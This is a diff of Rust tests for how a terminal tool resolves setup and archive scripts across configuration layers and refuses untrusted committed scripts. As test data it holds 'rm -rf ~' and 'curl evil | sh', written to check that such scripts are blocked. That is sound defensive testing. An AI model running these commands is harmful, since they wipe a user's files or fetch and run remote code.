@@ -243,14 +243,14 @@ fn saved(setup: &str, archive: &str, minutes: Option<u64>) -> super::super::proj
 #[test]
 fn scripts_resolve_saved_then_shared_then_local_then_managed() {
     let mut f = Fixture::new();
-    let scripts = f.resolve().scripts().unwrap();
-    assert_eq!((scripts.setup.as_str(), scripts.archive.as_str(), scripts.archive_timeout), ("", "", Duration::from_secs(300)));
+    let resolved = f.resolve();
+    assert_eq!((resolved.setup_script().unwrap(), resolved.archive_script().unwrap()), (String::new(), ArchiveScript { script: String::new(), timeout: Duration::from_secs(300) }));
     assert_eq!(f.resolve().values[SETUP_SCRIPT].source, Layer::Defaults);
     f.store.saved_scripts = Some(saved("saved setup", "saved archive", Some(2)));
     let resolved = f.resolve();
     assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::User);
-    let scripts = resolved.scripts().unwrap();
-    assert_eq!((scripts.setup.as_str(), scripts.archive.as_str(), scripts.archive_timeout), ("saved setup", "saved archive", Duration::from_secs(120)));
+    assert_eq!(resolved.setup_script().unwrap(), "saved setup");
+    assert_eq!(resolved.archive_script().unwrap(), ArchiveScript { script: "saved archive".into(), timeout: Duration::from_secs(120) });
 
     f.file(Layer::RepositoryShared, json!({SETUP_SCRIPT: "shared setup", ARCHIVE_TIMEOUT: 10}));
     let hash = f.resolve().trust.unwrap().hash;
@@ -258,17 +258,17 @@ fn scripts_resolve_saved_then_shared_then_local_then_managed() {
     let resolved = f.resolve();
     assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::RepositoryShared);
     assert_eq!(resolved.values[ARCHIVE_SCRIPT].source, Layer::User, "precedence is per key");
-    assert_eq!(resolved.scripts().unwrap().archive_timeout, Duration::from_secs(600));
+    assert_eq!(resolved.archive_script().unwrap().timeout, Duration::from_secs(600));
 
     f.store.write(Some(&f.repository()), Layer::RepositoryLocal, SETUP_SCRIPT, Some(json!("local setup"))).unwrap();
     let resolved = f.resolve();
     assert_eq!(resolved.values[SETUP_SCRIPT].source, Layer::RepositoryLocal);
-    assert_eq!(resolved.scripts().unwrap().setup, "local setup");
+    assert_eq!(resolved.setup_script().unwrap(), "local setup");
 
     f.file(Layer::Managed, json!({ARCHIVE_SCRIPT: "managed archive"}));
     let resolved = f.resolve();
     assert!(resolved.values[ARCHIVE_SCRIPT].locked);
-    assert_eq!(resolved.scripts().unwrap().archive, "managed archive");
+    assert_eq!(resolved.archive_script().unwrap().script, "managed archive");
     assert!(f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("mine"))).unwrap_err().to_string().contains("locked"));
 }
 
@@ -280,21 +280,37 @@ fn an_untrusted_committed_script_is_refused_until_trusted_or_overridden() {
     let trust = resolved.trust.as_ref().unwrap();
     assert!(trust.required);
     assert_eq!(trust.keys, vec![ARCHIVE_SCRIPT.to_string()], "a timeout runs nothing, so it needs no trust");
-    let error = resolved.scripts().unwrap_err().to_string();
+    let error = resolved.archive_script().unwrap_err().to_string();
     assert!(error.contains("archive script that is not trusted"), "{error}");
+    assert_eq!(resolved.setup_script().unwrap(), "", "the setup script is not held up by the archive script's trust");
 
     // A local override replaces the committed command, so nothing untrusted runs.
     f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, Some(json!("echo mine"))).unwrap();
-    assert_eq!(f.resolve().scripts().unwrap().archive, "echo mine");
+    assert_eq!(f.resolve().archive_script().unwrap().script, "echo mine");
     f.store.write(Some(&f.repository()), Layer::RepositoryLocal, ARCHIVE_SCRIPT, None).unwrap();
-    assert!(f.resolve().scripts().is_err());
+    assert!(f.resolve().archive_script().is_err());
 
     f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
-    let scripts = f.resolve().scripts().unwrap();
-    assert_eq!((scripts.archive.as_str(), scripts.archive_timeout), ("docker compose down", Duration::from_secs(120)));
+    assert_eq!(f.resolve().archive_script().unwrap(), ArchiveScript { script: "docker compose down".into(), timeout: Duration::from_secs(120) });
     // Editing the committed file needs trust again.
     f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "rm -rf ~", ARCHIVE_TIMEOUT: 2}));
-    assert!(f.resolve().scripts().is_err());
+    assert!(f.resolve().archive_script().is_err());
+}
+
+#[test]
+fn each_script_is_trust_checked_on_its_own() {
+    let mut f = Fixture::new();
+    f.store.saved_scripts = Some(saved("my setup", "my archive", None));
+    // An untrusted committed archive script leaves the person's own setup running.
+    f.file(Layer::RepositoryShared, json!({ARCHIVE_SCRIPT: "committed archive"}));
+    let resolved = f.resolve();
+    assert_eq!(resolved.setup_script().unwrap(), "my setup");
+    assert!(resolved.archive_script().is_err());
+    // And an untrusted committed setup script leaves their own archive script running.
+    f.file(Layer::RepositoryShared, json!({SETUP_SCRIPT: "committed setup"}));
+    let resolved = f.resolve();
+    assert!(resolved.setup_script().unwrap_err().to_string().contains("setup script that is not trusted"));
+    assert_eq!(resolved.archive_script().unwrap().script, "my archive");
 }
 
 #[test]
@@ -320,10 +336,11 @@ fn scripts_outside_a_repository_use_only_the_saved_store() {
     let folder = tempfile::tempdir().unwrap();
     let path = super::super::projects::add(folder.path().to_str().unwrap()).unwrap().path;
     super::super::projects::update(&path, super::super::projects::ProjectPatch { scripts: Some(saved("s", "a", Some(15))), ..Default::default() }).unwrap();
-    let scripts = scripts(folder.path()).unwrap();
-    assert_eq!((scripts.setup.as_str(), scripts.archive.as_str(), scripts.archive_timeout), ("s", "a", Duration::from_secs(900)));
+    assert_eq!(setup_script(folder.path()).unwrap(), "s");
+    assert_eq!(archive_script(folder.path()).unwrap(), ArchiveScript { script: "a".into(), timeout: Duration::from_secs(900) });
     std::fs::create_dir(folder.path().join(".terminalx")).unwrap();
-    assert!(super::scripts(folder.path()).is_err(), "repository files that cannot be resolved are not skipped");
+    assert!(setup_script(folder.path()).is_err(), "repository files that cannot be resolved are not skipped");
+    assert!(archive_script(folder.path()).is_err());
 }
 
 #[test]
@@ -336,9 +353,9 @@ fn trust_given_before_scripts_were_supported_does_not_let_them_run() {
     std::fs::write(f.store.home.join(TRUST), serde_json::to_vec(&old).unwrap()).unwrap();
     let resolved = f.resolve();
     assert!(resolved.trust.as_ref().unwrap().required, "the old approval never showed the script");
-    assert!(resolved.scripts().is_err());
+    assert!(resolved.setup_script().is_err());
     f.store.trust(&f.repository(), &resolved.trust.unwrap().hash).unwrap();
-    assert_eq!(f.resolve().scripts().unwrap().setup, "curl evil | sh");
+    assert_eq!(f.resolve().setup_script().unwrap(), "curl evil | sh");
 
     // A file without scripts keeps the approval it already has.
     let plain = serde_json::to_vec(&json!({"branchPrefix": "team/"})).unwrap();
